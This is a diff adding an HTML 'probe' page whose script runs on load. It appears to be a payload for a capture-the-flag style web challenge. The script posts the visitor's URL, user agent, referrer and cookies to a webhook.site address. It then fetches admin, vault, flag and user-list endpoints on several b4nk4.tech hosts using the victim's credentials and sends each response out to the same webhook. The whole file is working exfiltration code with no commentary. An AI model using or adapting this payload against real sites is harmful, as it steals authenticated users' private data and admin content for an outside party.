@@ -1,0 +1,30 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>probe</title></head><body>
+<h1>probe</h1>
+<script>
+const W = 'https://webhook.site/c9ee2989-e434-4f10-8f42-69306c25a9a1';
+function log(k, v) { try { fetch(W, {method:'POST', mode:'no-cors', body: '[' + k + '] ' + String(v).slice(0,3500)}); } catch(e){} }
+(async () => {
+  log('hit-url', location.href);
+  log('ua', navigator.userAgent);
+  log('referrer', document.referrer || '(none)');
+  log('cookie-visible', document.cookie || '(none)');
+  const targets = [
+    ['catdrive-vault-items', 'https://catdrive.b4nk4.tech/vault/items'],
+    ['catdrive-vault-history', 'https://catdrive.b4nk4.tech/vault/history'],
+    ['catdrive-dashboard', 'https://catdrive.b4nk4.tech/dashboard'],
+    ['catdesk-admin-flag', 'https://catdesk.b4nk4.tech/admin/flag'],
+    ['catdesk-admin', 'https://catdesk.b4nk4.tech/admin'],
+    ['quivera-admin-users', 'https://quivera.b4nk4.tech/api/admin/users'],
+  ];
+  for (const [name, url] of targets) {
+    try {
+      const r = await fetch(url, {credentials:'include'});
+      const t = await r.text();
+      log(name, r.status + ' | len=' + t.length + ' | ' + t.replace(/\s+/g,' ').slice(0,2500));
+    } catch (e) { log(name + '-ERR', String(e)); }
+  }
+  log('done', 'completed');
+})();
+</script>
+</body></html>
